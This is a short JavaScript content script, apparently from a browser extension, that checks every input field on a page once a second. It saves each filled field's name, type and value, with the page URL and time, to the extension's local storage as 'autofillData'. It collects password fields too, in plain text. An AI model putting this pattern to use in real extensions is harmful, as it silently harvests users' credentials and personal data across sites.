

const handleDOMContentLoaded = () => {
  console.log("DOM fully loaded and parsed");

  const observedFields = new Set();

  // Function to check input fields and log changes
  const checkFields = () => {

    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
      if (input.value && !observedFields.has(input)) {
        observedFields.add(input);
        const fieldData = {
          name: input.name || input.id || 'unknown',
          value: input.value,
          type: input.type
        };


        // Store the data
        chrome.storage.local.get({ autofillData: [] }, (result) => {
          const updatedData = result.autofillData;
          const siteData = {
            url: window.location.href,
            data: [fieldData],
            timestamp: new Date().toLocaleString()  // Use local date and time
          };
          updatedData.push(siteData);
          chrome.storage.local.set({ autofillData: updatedData }, () => {

          });
        });
      }
    });
  };

  // Log initial setup


  // Periodically check for filled input fields
  setInterval(checkFields, 1000);
};

// Listen for the DOMContentLoaded event
document.addEventListener('DOMContentLoaded', handleDOMContentLoaded);

// Also listen for the load event as a fallback
window.addEventListener('load', handleDOMContentLoaded);
